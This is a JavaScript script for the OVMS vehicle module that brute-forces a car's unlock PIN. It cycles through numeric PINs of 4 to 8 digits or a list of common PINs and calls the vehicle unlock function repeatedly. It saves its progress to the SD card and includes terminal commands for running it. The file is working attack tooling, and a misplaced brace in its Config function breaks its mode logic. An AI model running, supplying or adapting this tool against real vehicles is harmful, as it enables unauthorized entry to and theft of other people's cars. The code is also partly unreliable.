/* CRACK - Brute force a PIN

Original code by markwj from OpenVehicles / TMC
Based on https://www.openvehicles.com/vuln-tr-20181203a


2020 July - Pieter Danhieux
- Added save/restore functionality
- Added proper PIN code padding
- Rewritten bruteforce configuration
- Add common PIN codes mode to test for


== Usage instructions on OVMS terminal
script eval 'CRACK=require("lib/crack-ng"); CRACK.Config("bruteforce",4,700); CRACK.Delay(80); CRACK.Status()'
script eval 'CRACK.PrintPINs(10)'
script eval 'CRACK.Run()'

script eval 'CRACK=require("lib/crack-ng"); CRACK.Config("common",); CRACK.Delay(80); CRACK.Status()'
script eval 'CRACK.PrintPINs(10)'
script eval 'CRACK.Run()'

*/

var running = 0;          // stores if the cracking is still running

var current = 0;          // stores PIN counter
var currentPINTry = "";   // PIN counter padded and converted to string
var previousPINTry = "";   // previous PIN counter padded and converted to string
var start = 0;
var finish = 9999;
var delay = 1000;         // delay in MS between tries
var chars = 4;            // use min 4 char PIN code. could be max 8 in Tesla VDS
var mode = null;          // cracking mode (bruteforce, commonly used)

// source - https://www.datagenetics.com/blog/september32012/
var commonPINs_8 = ["12345678", "11111111", "88888888", "87654321", "00000000", "12341234", "69696969", "12121212", "11223344", "12344321", "77777777", "99999999", "22222222", "55555555", "33333333", "44444444", "66666666", "11112222", "13131313", "10041004"];
var commonPINs_7 = ["1234567", "7777777", "1111111", "8675309", "1234321", "0000000", "4830033", "7654321", "5201314", "0123456", "2848048", "7005425", "1080413", "7895123", "1869510", "3223326", "1212123","1478963", "2222222", "5555555"];
var commonPINs_6 = ["123456", "123123", "111111", "121212", "123321", "666666", "000000", "654321", "696969", "112233", "159753", "292513", "131313", "123654", "222222", "789456", "999999", "101010", "777777", "007007"];
var commonPINs_5 = ["12345", "11111", "55555", "00000", "54321", "13579", "77777", "22222", "12321", "99999", "33333", "00700", "90210", "88888", "38317", "09876", "44444", "98765", "01234", "42069"];
var commonPINs_4 = ["1234", "1111", "0000", "1212", "7777", "1004", "2000", "4444", "2222", "6969", "9999", "3333", "5555", "6666", "1122", "1313", "8888", "4321", "2001", "1010"];

var commonPINs_VINS = [ "0771"];

var commonPINs = commonPINs_4.concat(commonPINs_5).concat(commonPINs_6).concat(commonPINs_7).concat(commonPINs_8).concat(commonPINs_VINS);
var commonPINcounter = 0;

var subid;
var AttemptCounter = 0;
var foundPIN = null;

// object to store the last saved progress to restore on crash
var crackprogress = {
  "time": null,
  "v.crack.mode" : null,
  "v.crack.chars" : 4,          // use min 4 char PIN code. could be max 8 in Tesla VDS
  "v.crack.lastPIN" : null,
  "v.crack.startPIN" : null,
  "v.crack.lastPIN" : null,
  "v.crack.delay" : 0,
};

// file to store saved progress. ensure
const storeFile = "/sd/crack.jx";



// Saving to VFS may cause short blockings, so only allow when vehicle is off
function allowSave() {
  return !OvmsMetrics.Value("v.e.on");
}

function saveProgress() {
  crackprogress["time"] = new Date().getTime();
  crackprogress["v.crack.lastPIN"] = currentPINTry;
  if (storeFile && allowSave()) {
    VFS.Save({
      path : storeFile,
      data : Duktape.enc('jx', crackprogress),
      fail : function(error) {
        print("Error saving progress: " + error);
      }
    });
  } else {
    print("Warning: not saving to "+ storeFile +" v.e.on ="+ OvmsMetrics.Value("v.e.on") +"\n");
  } 
}

function restoreProgress() {
  if (storeFile) {
    var req = VFS.Load({
      path : storeFile,
      done : function(data) {
        crackprogress = Duktape.dec('jx', data);
        start = crackprogress["v.crack.lastPIN"];
        finish = crackprogress["v.crack.finishPIN"];
        delay = crackprogress["v.crack.delay"];
        chars = crackprogress["v.crack.chars"];
        mode = crackprogress["v.crack.mode"];
      },
      fail : function(error) {
        print("Error loading progress: " + error);
      }
    });
  } else {
    print("Warning: not loading from "+ storeFile +"\n");
  } 
}

// prepend with zeroes to get proper PIN
function PINPad(num, size) {
  var s = "00000000" + num;
  return s.substr(s.length-size);
 }


// provide the system with another PIN number
function GetNextPIN() {

  if (mode == "bruteforce") {
    current = current + 1;

    // Have we exhausted all possibilities within the current length?
    if (current > finish)
      {
      // increase PIN code lenght and reculate end goal
      if (chars < 8) { 
        chars++;
        finish = PINPad(99999999, chars);
        OvmsNotify.Raise("info", "usr.crack.timer", "PIN not found with current length crack increasing to length (" + chars +")");
        crackprogress["v.crack.finishPIN"] = finish;
        crackprogress["v.crack.chars"] = chars;
      } else {
        running = 0;
        PubSub.unsubscribe(subid);
        current = finish;
        OvmsNotify.Raise("info", "usr.crack.timer", "PIN crack finish at " + PINPad(current, chars) + " without success");
        return null
      }
    }

    return PINPad(current, chars)
  }

  if (mode == "common") {
    if (commonPINcounter < commonPINs.length) {
      var a = commonPINs[commonPINcounter];
      commonPINcounter++;
      return a;

    } else {

      running = 0;
      PubSub.unsubscribe(subid);
      commonPINcounter=0;
      OvmsNotify.Raise("info", "usr.crack.timer", "PIN code is not common. You will need to use bruteforce mode");
      return null;
    }
  }

 }

// main routine
var myTimerHandler = function(msg, data)
  {
  // see if process is still running
  if (! running) 
    return;

  // See if we have a successful unlock
  if (! OvmsMetrics.Value("v.e.locked"))
    {
    running = 0;
    saveProgress();
    foundPIN = previousPINTry + " or " + currentPINTry;
    PubSub.unsubscribe(subid);
    OvmsNotify.Raise("info", "usr.crack.timer", "PIN crack unlocked vehicle with one of these PINs: " + foundPIN);
    return;
    }


  // Get next PIN number
  previousPINTry = currentPINTry;   // store previous number as it could have been the right PIN
  currentPINTry = GetNextPIN();

  // Try to unlock the car using PIN <current>
  OvmsVehicle.Unlock(currentPINTry);

  // Save progress every 1000 attempts
  AttemptCounter++;
  if (AttemptCounter == 1000) {
    saveProgress();
    AttemptCounter=0;
  }
  // Setup for the next attempt
  OvmsEvents.Raise('usr.crack.timer', delay);
  }


exports.Status = function()
  {
  if (running)
    {
    print("Running...\n");
    print("  Mode is " + mode +"\n")
    if (mode == "bruteforce")
      print("  Range " + crackprogress["v.crack.startPIN"] + " ... " + crackprogress["v.crack.finishPIN"] + "\n");   
    print("  Delay is " + delay  + "ms\n");
    print("  Currently at " + currentPINTry + "\n");
    saveProgress();
    }
  else
    {
    print("Not Running, and configured as:\n");
    print("  Mode is " + mode +"\n")
    if (mode == "bruteforce")
      print("  Range " + start + " ... " + finish + "\n");
    if (mode == "common")
      print("  "+commonPINs.length + " common PIN codes to test\n");
    print("  Delay is " + delay  + "ms\n");

    if (foundPIN)
      print ("  Likely PINs "+foundPIN+"\n");
    }
  if (OvmsMetrics.Value("v.e.locked"))
    {
    print("  Vehicle is locked\n");
    }
  else
    {
    print("  Vehicle is unlocked\n");
    }
  }

exports.PrintPINs = function(val)
  {

  if (!val)
      val = 10;

  current = start;

  var testPINcounter = 0;
  var testPIN = GetNextPIN();
  print("Testing PIN generation algorithm ...\n");  

  while((testPIN != null) && (testPINcounter <= val)) {
    testPINcounter++;
    print(testPIN+", ");
    testPIN=GetNextPIN();
    // Setup for the next attempt
    OvmsEvents.Raise('usr.crack.timer', delay);
    }
  print("\n");
  }

exports.Config = function(val_mode, val_length, val_start)
  {
    if ((val_length >= 4) && (val_length <= 8)) {

      
      if (val_mode == "common") {
        mode = "common";
        print("Setting commonly used PINs mode\n");if (val_mode == "bruteforce") {
        mode = "bruteforce";
        chars = val_length;
        print("Setting bruteforce mode\n");
        print("Set starting length value to " + chars + " e.g " + PINPad("00000000",chars) +"\n");
        start = val_start;
        print("Set start value to " + PINPad(start,chars) + "\n");
        finish = PINPad(99999999, chars);
        print("Set finish value to " + finish + "\n");
      }
    
        print("Set max length value to " + chars + " e.g " + PINPad("00000000",chars) +"\n");
      }

    } else {
        print("Error: length should be min 4 and max 8 \n");  
    }
  }

exports.Help = function()
  {
  print("Here are the available commands:\n");
  print(" Config(mode, length, [start])   Configure the cracking mode, length. Mode can be:\n");
  print("                                     \"bruteforce\", with a start length and you can optionally specify the start PIN code. e.g. Config(\"bruteforce\", 4, 1) = 0001\n");
  print("                                     \"common\", which will not bruteforce but use commonly used PIN codes up to length specified e.g. Config(\"common\", 5)\n");
  print(" Run()                           Run\n")
  print(" Stop()                          Stop\n")
  print(" Status()                        Show progress and manual save progress in "+ storeFile + "\n");
  print(" Restore()                       Load last saved progress (inc configuration) in " +storeFile +"\n");
  print(" Delay(100)                      Set delays (milliseconds) in between attempts. Recommend 100-1000 to not overload\n");
  }

exports.Restore = function()
  {
  print("Restoring saved progress from " + storeFile + "\n");
  restoreProgress();
  }

exports.Delay = function(val)
  {
  delay = val;
  print("Set delay to " + delay + "ms\n");
  crackprogress["v.crack.delay"] = delay;
  }

exports.Run = function()
  {
  if (running)
    {
    print("Error: Already running\n");
    }
  else
    {

    if (OvmsMetrics.Value("v.e.locked")) {
      current = start-1;  //moving back 1 position
      commonPINcounter = 0;
      running = 1;

      // save configuration for restore function
      crackprogress["v.crack.startPIN"] = PINPad(start,chars);
      crackprogress["v.crack.finishPIN"] = finish;
      crackprogress["v.crack.delay"] = delay;
      crackprogress["v.crack.chars"] = chars;
      crackprogress["v.crack.mode"] = mode;

      subid = PubSub.subscribe('usr.crack.timer', myTimerHandler);
      OvmsNotify.Raise("info", "usr.crack.timer", "PIN crack running in "+ mode + " mode ... ");
      OvmsEvents.Raise('usr.crack.timer', delay);
    } else {
      print("Car seems already unlocked?\n")
    }
    }
  }

exports.Stop = function()
  {
  if (!running)
    {
    print("Error: Not currently running\n");
    }
  else
    {
    running = 0;
    PubSub.unsubscribe(subid);
    print("Stopped run\n");
    }
  }

